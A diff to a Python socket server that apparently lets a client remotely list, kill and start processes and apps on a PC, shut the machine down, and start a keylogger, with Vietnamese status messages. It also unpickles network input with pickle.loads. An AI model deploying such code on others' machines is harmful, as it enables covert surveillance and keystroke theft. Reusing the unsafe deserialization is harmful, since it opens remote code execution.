@@ -84,18 +84,6 @@ class SocketServer(Socket):
             msg += s
             length_recv += len(s)
         return pickle.loads(msg)
-    # def Send_(self, data):
-    #     if self.verbose:
-    #         print('Sending data of size ',len(data))
-    #     if type(data) == str:
-    #         data = data.encode()
-    #     self.conn.sendall(data)
-    #     if self.verbose:
-    #         print('Data sent!!')
-    # def Receive(self,size=4096):
-    #     if self.verbose:
-    #         print('Receiving data...')
-    #     return self.conn.recv(size)
     def Choices(self,msg):
         if msg == 'Connecting...':
             self.Send('Connected.')
@@ -106,21 +94,43 @@ class SocketServer(Socket):
             self.conn.close()
             self.Close()
             os.system("shutdown /s /t 1")
-        elif msg == 'Process':
-            msg2 = self.Receive()
-            if msg2 == 'List process':
-                data = process.getListProcess()
-                self.Send(data)
-            elif msg2 == 'Kill process':
-                ID = self.Receive()
-                process.killProcess(ID)
-            elif msg2 == 'Start process':
-                name = self.Receive()
-                process.Startprocess(name)
-            
-            
-        elif msg =='App':
-            pass
+        elif msg == 'List process':
+            listprocess = process.getListProcess()
+            self.Send(listprocess)
+        elif msg == 'Kill process':
+            id = self.Receive()
+            err=0
+            listprocess = process.getListProcess()
+            for value in listprocess:
+                if str(value['id']) == id:
+                    process.killProcess(id)
+                    self.Send('Đã diệt process')
+                    err=err+1
+                    break
+            if err == 0:
+                self.Send('Không tìm thấy process')
+        elif msg == 'Start process':
+            name = self.Receive()
+            process.startProcess(name)
+            self.Send('Process đã được bật')
+        elif msg =='List app':
+            listapp = process.getListApp()
+            self.Send(listapp)
+        elif msg == 'Kill app':
+            id = self.Receive()
+            err=0
+            listapp = process.getListApp()
+            for app_id in listapp:
+                if str(app_id['id']) == id:
+                    process.killProcess(id)
+                    self.Send('Đã diệt chương trình')
+                    err=1
+            if err == 0:
+                self.Send('Không tìm thấy chương trình')
+        elif msg == 'Start app':
+            name = self.Receive()
+            process.startProcess(name)
+            self.Send('Chương trình đã được bật')
         elif msg =='Hook':
             keylog.start_keylog()
             hook_yet = True
